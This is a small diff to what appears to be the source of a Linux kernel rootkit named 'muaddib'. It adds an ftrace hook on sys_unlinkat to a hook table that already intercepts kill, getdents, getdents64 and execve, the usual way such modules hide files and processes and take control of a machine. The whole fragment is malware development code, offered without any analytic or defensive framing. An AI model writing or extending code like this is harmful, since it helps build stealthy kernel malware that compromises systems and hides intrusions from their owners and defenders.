@@ -8,6 +8,7 @@
 #include "accept_hook.c"
 #include "getdents_hook.c"
 #include "execve_hook.c"
+#include "unlinkat_hook.c"
 
 static struct ftrace_hook hooks[] = {
 	HOOK("sys_kill", muaddib_kill, &og_kill),
@@ -15,6 +16,7 @@ static struct ftrace_hook hooks[] = {
 	HOOK("sys_getdents64", muaddib_getdents64, &og_getdents64),
 	HOOK("sys_getdents", muaddib_getdents, &og_getdents),
 	HOOK("sys_execve", muaddib_execve, &og_execve),
+	HOOK("sys_unlinkat", muaddib_unlinkat, &og_unlinkat),
 };
 
 static int __init muaddib_init(void){
